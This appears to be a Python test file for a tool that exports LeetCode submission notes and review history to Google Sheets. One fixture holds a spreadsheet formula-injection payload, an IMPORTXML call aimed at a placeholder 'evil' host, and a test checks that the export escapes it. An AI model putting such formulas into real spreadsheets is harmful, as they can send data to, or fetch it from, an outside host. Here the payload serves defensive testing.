"""Tests for sheet rows: notes fidelity and formula-injection safety."""
import csv
import io
import sys
import tempfile
import unittest
from datetime import timezone
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

import google_sheets
import tracker
from comment_parser import NOTE_FIELDS


def make_tracker(tmp: Path):
    (tmp / "1-two-sum.py").unlink(missing_ok=True)
    data = {"schema_version": 2, "problems": {}}
    tracker.import_submission(tmp, data, {
        "submission_id": "1001", "frontend_id": "1", "slug": "two-sum",
        "title": "Two Sum", "difficulty": "Easy", "tags": ["Array", "Hash Table"],
        "submitted_at": "2025-05-01T10:00:00+00:00", "language": "python3",
        "status": "Accepted", "code": "# a\n# b\nclass Solution: pass\n",
        "runtime": "50 ms", "memory": "17 MB",
        "leetcode_notes": "=IMPORTXML(\"https://evil\",\"//x\")",
        "raw_comments": ["first comment", "second comment"],
        "notes": {
            "thought_process": "hash map",
            "notes": "forgot the empty input",
            "time_complexity": "O(n)",
        },
    })
    tracker.import_submission(tmp, data, {
        "submission_id": "1000", "frontend_id": "1", "slug": "two-sum",
        "title": "Two Sum", "difficulty": "Easy", "tags": ["Array", "Hash Table"],
        "submitted_at": "2025-04-30T10:00:00+00:00", "language": "python3",
        "status": "Wrong Answer", "code": "class Solution: fail\n",
    })
    return data


class TestRows(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)
        self.rows = google_sheets.build_rows(make_tracker(self.root))
        self.header = self.rows[0]

    def cell(self, row, name):
        return row[self.header.index(name)]

    def test_one_row_per_accepted_attempt_only(self):
        self.assertEqual(len(self.rows), 2)
        self.assertEqual(self.cell(self.rows[1], "submission_id"), "1001")

    def test_header_contains_all_note_fields(self):
        for field in NOTE_FIELDS:
            self.assertIn(field, self.header)

    def test_formula_injection_is_neutralized(self):
        self.assertEqual(self.cell(self.rows[1], "leetcode_notes"),
                         "'=IMPORTXML(\"https://evil\",\"//x\")")

    def test_sanitize_covers_all_dangerous_prefixes(self):
        for prefix in "=+-@":
            self.assertEqual(google_sheets.sanitize_cell(f"{prefix}x"), f"'{prefix}x")
        self.assertEqual(google_sheets.sanitize_cell("safe"), "safe")
        self.assertEqual(google_sheets.sanitize_cell(None), "")
        self.assertEqual(google_sheets.sanitize_cell(3), "3")

    def test_raw_comments_joined_with_newlines(self):
        self.assertEqual(self.cell(self.rows[1], "raw_comments"),
                         "first comment\nsecond comment")

    def test_structured_notes_in_separate_columns(self):
        self.assertEqual(self.cell(self.rows[1], "thought_process"), "hash map")
        self.assertEqual(self.cell(self.rows[1], "notes"), "forgot the empty input")
        self.assertEqual(self.cell(self.rows[1], "time_complexity"), "O(n)")
        self.assertEqual(self.cell(self.rows[1], "core_insight"), "")

    def test_review_columns_default_to_new(self):
        self.assertEqual(self.cell(self.rows[1], "review_state"), "new")
        self.assertEqual(self.cell(self.rows[1], "reps"), "0")

    def test_csv_round_trip_preserves_multiline_cells(self):
        path = self.root / "google-sheets.csv"
        google_sheets.write_csv(path, self.rows)
        with path.open(newline="", encoding="utf-8") as handle:
            parsed = list(csv.reader(handle))
        self.assertEqual(parsed, self.rows)

    def test_url_and_code_path_columns(self):
        self.assertEqual(self.cell(self.rows[1], "url"),
                         "https://leetcode.com/problems/two-sum/")
        self.assertEqual(self.cell(self.rows[1], "code_path"),
                         "1-two-sum.py")

    def test_sheet_cell_limit_is_checked_before_upload(self):
        rows = [list(google_sheets.HEADER), [""] * len(google_sheets.HEADER)]
        rows[1][0] = "x" * (google_sheets.MAX_CELL_CHARACTERS + 1)
        with self.assertRaises(ValueError):
            google_sheets.validate_sheet_rows(rows)

    def test_review_rows_match_reference_field_order(self):
        tracker_data = make_tracker(self.root)
        events = [{
            "problem": "1-two-sum",
            "grade": "Good",
            "reviewed_at": "2025-06-01T12:00:00+00:00",
            "failure_stage": "implementation",
            "elapsed_minutes": 12.5,
            "hints_used": 0,
            "notes": "clean retry",
        }]
        rows = google_sheets.build_review_rows(tracker_data, events)
        self.assertEqual(rows[0], google_sheets.REVIEW_HEADER)
        self.assertEqual(rows[1], [
            "2025-06-01T12:00:00+00:00", "Two Sum", "pass",
            "implementation", "12.5", "0", "clean retry",
        ])

    def test_hinted_pass_maps_to_partial_reference_result(self):
        tracker_data = make_tracker(self.root)
        rows = google_sheets.build_review_rows(tracker_data, [{
            "problem": "1-two-sum", "grade": "Easy",
            "reviewed_at": "2025-06-01T12:00:00+00:00",
            "hints_used": 1,
        }])
        self.assertEqual(rows[1][google_sheets.REVIEW_HEADER.index("result")], "partial")

    def test_template_rows_separate_thoughts_and_notes(self):
        tracker_data = make_tracker(self.root)
        problems = google_sheets.build_problem_rows(
            tracker_data, [], "zh1kang/dsa"
        )
        submissions = google_sheets.build_submission_rows(
            tracker_data, "zh1kang/dsa"
        )
        problem = problems[1]
        self.assertEqual(
            problem[google_sheets.PROBLEMS_HEADER.index("Thought Process")],
            "hash map",
        )
        self.assertEqual(
            problem[google_sheets.PROBLEMS_HEADER.index("Notes")],
            "forgot the empty input",
        )
        self.assertEqual(len(submissions), 3)
        accepted = next(row for row in submissions[1:] if row[0] == "1001")
        self.assertEqual(
            accepted[google_sheets.SUBMISSIONS_HEADER.index("Notes")],
            "forgot the empty input",
        )

    def test_problem_rows_contain_live_review_formulas(self):
        rows = google_sheets.build_problem_rows(
            make_tracker(self.root), [], "zh1kang/dsa"
        )
        status = rows[1][google_sheets.PROBLEMS_HEADER.index("Review Status")]
        days = rows[1][google_sheets.PROBLEMS_HEADER.index("Days Until Due")]
        self.assertTrue(status.startswith("=IF("))
        self.assertTrue(days.startswith("=IF("))

    def test_push_updates_template_tables_and_dashboard(self):
        class Worksheet:
            def __init__(self, title, rows, cols):
                self.title = title
                self.row_count = rows
                self.col_count = cols
                self.updated = None
                self.frozen = False
                self.formatted = []
                self.batch_updates = []
                self.cleared = []

            def resize(self, rows, cols):
                self.row_count = rows
                self.col_count = cols

            def update(self, **kwargs):
                self.updated = kwargs

            def batch_clear(self, ranges):
                self.cleared.extend(ranges)

            def freeze(self, **kwargs):
                self.frozen = kwargs == {"rows": 1}

            def format(self, range_name, cell_format):
                self.formatted.append((range_name, cell_format))

            def batch_update(self, values, **kwargs):
                self.batch_updates.append((values, kwargs))

        class Spreadsheet:
            def __init__(self):
                self.worksheets = {
                    "Problems": Worksheet("Problems", 1000, 35),
                    "Submissions": Worksheet("Submissions", 1000, 23),
                    "Reviews": Worksheet("Reviews", 1000, 20),
                    "README": Worksheet("README", 1000, 26),
                    "Due Today": Worksheet("Due Today", 1000, 26),
                    "Config": Worksheet("Config", 1000, 26),
                }
                self.requests = []

            def worksheet(self, title):
                return self.worksheets[title]

            def fetch_sheet_metadata(self):
                tables = {"Problems": "1", "Submissions": "2", "Reviews": "3"}
                return {"sheets": [
                    {
                        "properties": {"title": title, "sheetId": index},
                        "tables": ([{"tableId": tables[title]}]
                                   if title in tables else []),
                    }
                    for index, title in enumerate(self.worksheets, start=10)
                ]}

            def batch_update(self, body):
                self.requests.extend(body["requests"])

        spreadsheet = Spreadsheet()
        module = SimpleNamespace(
            oauth=lambda **kwargs: SimpleNamespace(open_by_key=lambda key: spreadsheet),
        )
        credentials = self.root / "client.json"
        credentials.write_text("{}")
        config = SimpleNamespace(
            spreadsheet_id="sheet", google_credentials_file=credentials,
            google_token_file=self.root / "token.json",
            problems_worksheet="Problems",
            submissions_worksheet="Submissions",
            reviews_worksheet="Reviews",
            github_repository="zh1kang/dsa",
            tracking_start_date=None,
            timezone=timezone.utc,
        )
        with patch.dict(sys.modules, {"gspread": module}):
            google_sheets.push_tracker(config, make_tracker(self.root), [])
        for title in ("Problems", "Submissions", "Reviews"):
            worksheet = spreadsheet.worksheets[title]
            self.assertTrue(worksheet.frozen)
            self.assertEqual(worksheet.updated["value_input_option"], "USER_ENTERED")
        self.assertTrue(spreadsheet.worksheets["README"].batch_updates)
        self.assertEqual(
            spreadsheet.worksheets["Due Today"].updated["value_input_option"],
            "USER_ENTERED",
        )
        self.assertEqual(
            spreadsheet.worksheets["Config"].updated["value_input_option"],
            "RAW",
        )
        self.assertEqual(
            sum("updateTable" in request for request in spreadsheet.requests), 3
        )

    def test_failed_update_does_not_clear_existing_rows(self):
        class Worksheet:
            row_count = 3
            col_count = len(google_sheets.PROBLEMS_HEADER)
            batch_cleared = False
            def freeze(self, **kwargs):
                pass
            def format(self, *args, **kwargs):
                pass
            def set_basic_filter(self, *args, **kwargs):
                pass
            def update(self, **kwargs):
                raise RuntimeError("network failed")
            def batch_clear(self, ranges):
                self.batch_cleared = True
        worksheet = Worksheet()
        spreadsheet = SimpleNamespace(worksheet=lambda name: worksheet)
        with self.assertRaises(RuntimeError):
            google_sheets._update_worksheet(
                spreadsheet, "Problems", [list(google_sheets.PROBLEMS_HEADER)]
            )
        self.assertFalse(worksheet.batch_cleared)


if __name__ == "__main__":
    unittest.main()
